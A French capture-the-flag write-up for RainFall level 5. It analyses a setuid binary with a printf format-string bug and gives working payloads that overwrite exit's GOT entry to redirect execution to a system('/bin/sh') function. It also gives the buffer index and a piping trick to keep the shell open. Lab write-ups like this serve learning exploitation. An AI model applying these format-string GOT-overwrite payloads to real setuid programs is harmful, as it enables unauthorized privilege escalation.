# Level5 — Analyse technique

## Binaire

- ELF 32-bit i386, dynamically linked, setuid setgid level6.
- Imports : printf, _exit, fgets, **system**, exit.
- Variable globale **m** @ 0x8049854 (non utilisée dans le flux observé).

## Fonctions

- **main** (0x8048504) : appelle `n()`.
- **n** (0x80484c2) : buffer 512 octets, `fgets(buffer, 0x200, stdin)`, **printf(buffer)** (format string), puis **exit(1)**. Ne retourne jamais.
- **o** (0x80484a4) : **system("/bin/sh")** (chaîne à 0x80485f0), puis _exit(1). Jamais appelée dans le flux normal.

## Vulnérabilité

- **Format string** dans `n()` : `printf(buffer)`.
- Après `printf`, le programme appelle **exit(1)**. En écrasant l’entrée **GOT** de **exit** (0x8049838) par l’adresse de **o** (0x080484a4), l’appel à `exit(1)` redirige vers **o()** → **system("/bin/sh")**.

## Exploit

- **Cible :** GOT de exit = **0x8049838**. Écrire **0x080484a4** (adresse de `o`) à cette adresse.
- **Méthode 1 (un seul %n) :** adresse 0x8049838 au début du buffer, puis **%134513811x** (4 + 134513811 = 134513815 → il manque 13 pour 0x080484a4, donc ajuster)… En fait 0x080484a4 = 134513828. Donc 4 + 134513824 = 134513828. Payload : `\x38\x98\x04\x08` + `%134513824x` + `%k$n` (k = index du buffer, à trouver via dump).
- **Méthode 2 (deux %hn) :** écrire 0x84a4 (33956) à 0x8049838 et 0x0804 (2052) à 0x804983a. Buffer : `\x3a\x98\x04\x08\x38\x98\x04\x08` + `%2044x%k$hn` + `%31904x%j$hn` (k = buffer, j = buffer+4 ; 8 + 2044 = 2052, 2052 + 31904 = 33956).

**RainFall :** index du buffer = **4** (dump `%1$p`…`%5$p` → 0x41414141 à l’index 4). Garder stdin ouvert avec `( python -c '...'; cat ) | ./level5` pour pouvoir taper dans le shell.

## Adresses utiles

| Élément | Valeur      |
|--------|-------------|
| o      | 0x080484a4  |
| GOT exit | 0x8049838 |
| /bin/sh (o) | 0x80485f0 |
